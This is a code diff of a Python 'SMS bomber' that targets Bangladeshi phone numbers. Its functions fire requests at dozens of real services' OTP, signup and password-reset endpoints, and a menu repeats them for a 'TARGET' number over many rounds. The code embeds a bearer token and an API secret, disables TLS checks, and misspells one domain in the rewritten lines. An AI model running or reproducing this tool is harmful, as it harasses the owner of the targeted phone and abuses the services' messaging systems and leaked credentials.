-            "phone_number": number
-        })
-        response = requests.post(url, headers=headers, data=data, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://reseller.circle.com.bd/api/v2/auth/signup", json={"name": "+88"+number, "email_or_phone": "+88"+number, "password": "123456lmn", "password_confirmation": "123456lmn", "register_by": "phone"}, headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent7})
+    except: pass
 
-def lmnXlija_48(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_50(number):
     try:
-        url = "https://auth.qcoom.com/api/v1/otp/send"
-        headers = {
-            "User-Agent": lmnXuserAgent4,
-            "Referer": "https://qcoom.com/",
-            "Content-Type": "application/json",
-        }
-        data = {
-            "mobileNumber": "+88"+number,
-        }
-        response = requests.post(url, json=data, headers=headers, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4, "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"}, json={"phone": number}, verify=False)
+    except: pass
 
-def lmnXlija_49(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_51(number):
     try:
-        url = "https://reseller.circle.com.bd/api/v2/auth/signup"
-        headers = {
-            "User-Agent": lmnXuserAgent7,
-            "Content-Type": "application/json",
-        }
-        data = {
-            "name": "+88"+number,
-            "email_or_phone": "+88"+number,
-            "password": "123456lmn",
-            "password_confirmation": "123456lmn",
-            "register_by": "phone"
-        }
-        response = requests.post(url, json=data, headers=headers)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://api-gateway.sundarbancourierltd.com/graphql", json={"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": number}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n    message\n    statusCode\n    result {\n      phone\n      otpCounter\n    }\n  }\n}"}, headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent10})
+    except: pass
 
-def lmnXlija_50(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_52(number):
     try:
-        url = "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0"
-        headers = {
-            "User-Agent": lmnXuserAgent4,
-            "Content-Type": "application/json",
-            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"
-        }
-        data = {
-            "phone": number
-        }
-        response = requests.post(url, headers=headers, json=data, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://api.toybox.live/bdapps_handler.php", headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent11}, data=json.dumps({"Operation": "CreateSubscription", "MobileNumber": "88"+number, "PackageID": 100, "Secret": "HJKX71%UHYH"}))
+    except: pass
 
-def lmnXlija_51(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_53(number):
+    try: requests.get("https://api.win2gain.com/api/Users/RequestOtp?msisdn=88"+number, headers={'sourcePlatform': 'web', 'client': '2'})
+    except: pass
+
+def lmnXlija_54(number):
     try:
-        url = "https://api-gateway.sundarbancourierltd.com/graphql"
-        data = {
-            "operationName": "CreateAccessToken",
-            "variables": {
-                "accessTokenFilter": {
-                    "userName": number
-                }
-            },
-            "query": """mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {
-                createAccessToken(accessTokenFilter: $accessTokenFilter) {
-                    message
-                    statusCode
-                    result {
-                        phone
-                        otpCounter
-                        __typename
-                    }
-                    __typename
-                }
-            }"""
-        }
-        headers = {
-            'Content-Type': 'application/json',
-            'Host': 'api-gateway.sundarbancourierltd.com',
-            'User-Agent': lmnXuserAgent10,
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Referer': 'https://customer.sundarbancourierltd.com/',
-            'Origin': 'https://customer.sundarbancourierltd.com',
-        }
-        response = requests.post(url, json=data, headers=headers)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp", json={"deviceId": "7dtdhid45c0f0901", "deviceInfo": {"deviceInfoSignature": "D0923F3GDHJXJDTIHFDTIGGHURHFATI7605A3FA", "deviceId": "7d8b0agi0g0f0901", "firebaseDeviceToken": "", "manufacturer": "MI", "modelName": "NOTE 10", "osFirmWireBuild": "", "osName": "Android", "osVersion": "10", "rootDevice": 0}, "operator": "Gp", "walletNumber": number}, headers={"Content-Type": "application/json"})
+    except: pass
 
-def lmnXlija_52(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_55(number):
     try:
-        url = "https://api.toybox.live/bdapps_handler.php"
-        data = {
-            "Operation": "CreateSubscription",
-            "MobileNumber": "88"+number,
-            "PackageID": 100,
-            "Secret": "HJKX71%UHYH"
-        }
-        headers = {
-            'Content-Type': 'application/json',
-            'User-Agent': lmnXuserAgent11
-        }
-        response = requests.post(url, headers=headers, data=json.dumps(data))
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://rootsedulive.com/api/auth/register", data={"name": "Rubish Khan", "phone": f"88{number}", "email": f"subap{number}agli2023@gmail.com", "password": "iDSnWh6rzp9KNAY", "confirmPassword": "iDSnWh6rzp9KNAY"}, headers={"Content-Type": "application/x-www-form-urlencoded"}, verify=False)
+    except: pass
 
-def lmnXlija_53(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_56(number):
     try:
-        url = "https://api.win2gain.com/api/Users/RequestOtp?msisdn=88"+number
-        headers = {
-            'sourcePlatform': 'web',
-            'client': '2'
-        }
-        response = requests.get(url, headers=headers)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://rootsedulive.com/api/auth/forget-password", data={"phoneOrEmail": f"88{number}"}, headers={"Content-Type": "application/x-www-form-urlencoded"}, verify=False)
+    except: pass
 
-def lmnXlija_54(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_57(number):
     try:
-        url = "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp"
-        data = {
-            "deviceId": "7dtdhid45c0f0901",
-            "deviceInfo": {
-                "deviceInfoSignature": "D0923F3GDHJXJDTIHFDTIGGHURHFATI7605A3FA",
-                "deviceId": "7d8b0agi0g0f0901",
-                "firebaseDeviceToken": "",
-                "manufacturer": "MI",
-                "modelName": "NOTE 10",
-                "osFirmWireBuild": "",
-                "osName": "Android",
-                "osVersion": "10",
-                "rootDevice": 0
-            },
-            "operator": "Gp",
-            "walletNumber": number
-        }
-        headers = {
-            "Content-Type": "application/json"
-        }
-        response = requests.post(url, json=data, headers=headers)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://www.mcbaffiliate.com/Affiliate/RequestOTP", data={"PhoneNumber": number}, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": lmnXuserAgent7}, verify=False)
+    except: pass
 
-def lmnXlija_55(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_58(number):
     try:
-        url = "https://rootsedulive.com/api/auth/register"
-        headers = {
-            "Content-Type": "application/x-www-form-urlencoded"
-        }
-        data = {
-            "name": "Rubish Khan",
-            "phone": f"88{number}",
-            "email": f"subap{number}agli2023@gmail.com",
-            "password": "iDSnWh6rzp9KNAY",
-            "confirmPassword": "iDSnWh6rzp9KNAY"
-        }
-        response = requests.post(url, data=data, headers=headers, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post(f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, verify=False)
+    except: pass
 
-def lmnXlija_56(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_59(number):
     try:
-        url = "https://rootsedulive.com/api/auth/forget-password"
-        headers = {
-            "Content-Type": "application/x-www-form-urlencoded"
-        }
-        data = {
-            "phoneOrEmail": f"88{number}"
-        }
-        response = requests.post(url, data=data, headers=headers, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://bkshopthc.gramreenphone.com/api/v1/fwa/request-for-otp", json={"phone": number, "email": "", "language": "en"}, headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent9}, verify=False)
+    except: pass
 
-def lmnXlija_57(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_60(number):
     try:
-        url = "https://www.mcbaffiliate.com/Affiliate/RequestOTP"
-        headers = {
-            "User-Agent": lmnXuserAgent7,
-            "Content-Type": "application/x-www-form-urlencoded"
-        }
-        data = {
-            "PhoneNumber": number
-        }
-        response = requests.post(url, data=data, headers=headers, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post(f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{number}/", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, verify=False)
+    except: pass
 
-def lmnXlija_58(number):#----------{"100% OK": "RUBISH"}----------#
-    try:
-        url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}"
-        headers = {
-            "User-Agent": lmnXuserAgent4,
-            "Content-Type": "application/json",
-        }
-        response = requests.post(url, headers=headers, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+# =========================================================
+#               ADVANCED ATTACK MENU
+# =========================================================
 
-def lmnXlija_59(number):#----------{"100% OK": "RUBISH"}----------#
-    try:
-        url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
-        data = {
-            "phone": number,
-            "email": "",
-            "language": "en"
-        }
-        headers = {
-            'Content-Type': 'application/json',
-            'User-Agent': lmnXuserAgent9
-        }
-        response = requests.post(url, json=data, headers=headers, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-
-def lmnXlija_60(number):#----------{"100% OK": "RUBISH"}----------#
-    try:
-        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{number}/"
-        headers = {
-            "User-Agent": lmnXuserAgent4,
-            "Content-Type": "application/json",
-        }
-        response = requests.post(url, headers=headers, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-
-
-#----------[ RUBISH ATTACKING MENU ]----------#
-
-
-def DARKS(number,amo):
+def DARKS(number, amo):
     os.system("clear")
-    print_banner()
-    print("\n"*2)
-    console.print(Align.center("[bold yellow]INFO"))
-    console.print(Align.center(Panel.fit(f"[bold blue]⚡[bold green]  SMS SPAM [bold cyan]v2.0 [bold red]STARTED\n"
-     f"[green]VICTIM [bold white]| [bold green]NUMBER ➤ [bold yellow]{number} | AMMOUNT ➤ [bold red]{amo}", border_style="bold cyan")))
+    print_advanced_banner()
     
-    console.rule("[bold cyan]ATTACK STARTED")
-    print("\n")
+    # Attack info panel
+    console.print(Align.center(
+        Panel.fit(
+            f"[bold {NEON_PINK}]╔══════════════════════════════════════╗[/]\n"
+            f"[bold {NEON_PINK}]║[/]  [bold {NEON_YELLOW}]⚡ BOMBING SEQUENCE INITIATED ⚡[/] [bold {NEON_PINK}]║[/]\n"
+            f"[bold {NEON_PINK}]╚══════════════════════════════════════╝[/]\n\n"
+            f"[bold {NEON_CYAN}]┌─────────────────────────────────────┐[/]\n"
+            f"[bold {NEON_CYAN}]│[/] [bold {NEON_GREEN}]TARGET  ►[/] [bold {NEON_YELLOW}]+88 {number}[/]\n"
+            f"[bold {NEON_CYAN}]│[/] [bold {NEON_GREEN}]ROUNDS  ►[/] [bold {NEON_RED}]{amo}[/]\n"
+            f"[bold {NEON_CYAN}]│[/] [bold {NEON_GREEN}]APIs    ►[/] [bold {NEON_PURPLE}]60 ACTIVE[/]\n"
+            f"[bold {NEON_CYAN}]└─────────────────────────────────────┘[/]",
+            border_style=f"bold {NEON_PINK}",
+            box=DOUBLE
+        )
+    ))
+    
+    print()
+    console.rule(f"[bold {NEON_PINK}]◤ BOMBARDMENT STARTED ◢[/]", style=f"bold {NEON_PINK}")
+    print()
+    
+    # Round counter display
+    total_sent = 0
     for x in range(amo):
-        x+=1
-        lmnXlija_1(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-01]")
-        lmnXlija_2(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-02]")
-        lmnXlija_3(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-03]")
-        lmnXlija_4(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-04]")
-        lmnXlija_5(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-05]")
-        lmnXlija_6(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-06]")
-        lmnXlija_7(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-07]")
-        lmnXlija_8(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-08]")
-        lmnXlija_9(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-09]")
-        lmnXlija_10(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-10]")
-        lmnXlija_11(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-11]")
-        lmnXlija_12(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-12]")
-        lmnXlija_13(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-13]")
-        lmnXlija_14(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-14]")
-        lmnXlija_15(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-15]")
-        lmnXlija_16(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-16]")
-        lmnXlija_17(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-17]")
-        lmnXlija_18(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-18]")
-        lmnXlija_19(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-19]")
-        lmnXlija_20(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-20]")
-        lmnXlija_21(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-21]")
-        lmnXlija_22(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-22]")
-        lmnXlija_23(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-23]")
-        lmnXlija_24(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-24]")
-        lmnXlija_25(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-25]")
-        lmnXlija_26(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-26]")
-        lmnXlija_27(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-27]")
-        lmnXlija_28(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-28]")
-        lmnXlija_29(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-29]")
-        lmnXlija_30(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-30]")
-        lmnXlija_31(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-31]")
-        lmnXlija_32(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-32]")
-        lmnXlija_33(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-33]")
-        lmnXlija_34(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-34]")
-        lmnXlija_35(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-35]")
-        lmnXlija_36(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-36]")
-        lmnXlija_37(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-37]")
-        lmnXlija_38(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-38]")
-        lmnXlija_39(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-39]")
-        lmnXlija_40(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-40]")
-        lmnXlija_41(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-41]")
-        lmnXlija_42(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-42]")
-        lmnXlija_43(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-43]")
-        lmnXlija_44(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-44]")
-        lmnXlija_45(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-45]")
-        lmnXlija_46(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-46]")
-        lmnXlija_47(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-47]")
-        lmnXlija_48(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-48]")
-        lmnXlija_49(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-49]")
-        lmnXlija_50(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-50]")
-        lmnXlija_51(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-51]")
-        lmnXlija_52(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-52]")
-        lmnXlija_53(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-53]")
-        lmnXlija_54(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-54]")
-        lmnXlija_55(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-55]")
-        lmnXlija_56(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-56]")
-        lmnXlija_57(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-57]")
-        lmnXlija_58(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-58]")
-        lmnXlija_59(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-59]")
-        lmnXlija_60(number);RUBISH(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-60]")
-    print("\n")
-    lnx()
-    console.print(Align.center(Panel.fit("[bold green] SMS SPAM {g}Successfully Completed !", border_style="bold yellow")))
-    print("\n")
-    rull = input(f"{c}   <{w}/{c}> {g}💥 Please Run Again For Spam Again {w}y/{g}n ➤ ")
-    if rull == "y":
-       os.system("clear")
-       BCS()
+        x += 1
+        print(f"\n{NEON_CYAN}┏━━━ [ ROUND {NEON_YELLOW}{x}{NEON_CYAN} / {NEON_YELLOW}{amo}{NEON_CYAN} ] ━━━{RESET}")
+        
+        for i in range(1, 61):
+            try:
+                func = globals()[f"lmnXlija_{i}"]
+                func(number)
+            except: pass
+            total_sent += 1
+            # Compact progress indicator
+            bar_len = 30
+            filled = int(bar_len * i / 60)
+            bar = f"{NEON_GREEN}{'█' * filled}{DARK_GRAY}{'░' * (bar_len - filled)}{RESET}"
+            sys.stdout.write(f"\r  {NEON_CYAN}[{bar}{NEON_CYAN}] {NEON_YELLOW}{i:02d}/60{RESET}  {NEON_PINK}💣{RESET}")
+            sys.stdout.flush()
+        
+        print()
+    
+    print()
+    console.rule(style=f"bold {NEON_PINK}")
+    console.print(Align.center(
+        Panel.fit(
+            f"[bold {NEON_GREEN}]✓ ATTACK COMPLETED SUCCESSFULLY ✓[/]\n"
+            f"[bold {NEON_YELLOW}]Total SMS Sent: [bold {NEON_RED}]{total_sent}[/]\n"
+            f"[bold {NEON_CYAN}]Target: [bold {NEON_YELLOW}]+88 {number}[/]",
+            border_style=f"bold {NEON_GREEN}",
+            box=DOUBLE
+        )
+    ))
+    print()
+    
+    rull = input(f"  {NEON_CYAN}┌─[{NEON_GREEN}?{NEON_CYAN}]─[{NEON_PINK} RUN AGAIN? {NEON_CYAN}]──►{NEON_GREEN} y/n {RESET}")
+    if rull.lower() == "y":
+        os.system("clear")
+        BCS()
     else:
-       sys.exit(0)
+        console.print(Align.center(f"\n[bold {NEON_RED}]◤ EXITING... STAY GHOST ◢[/]\n"))
+        sys.exit(0)
 
+# =========================================================
+#                    ENTRY POINT
+# =========================================================
 
 if __name__ == "__main__":
+    os.system("clear")
+    # Boot animation
+    console.print(Align.center(f"[bold {NEON_GREEN}]◤ INITIALIZING SYSTEM ◢[/]"))
+    progress_scan("Loading modules")
+    progress_scan("Connecting to servers")
+    progress_scan("Bypassing security")
+    print()
+    time.sleep(0.5)
     os.system("clear")
     BCS()
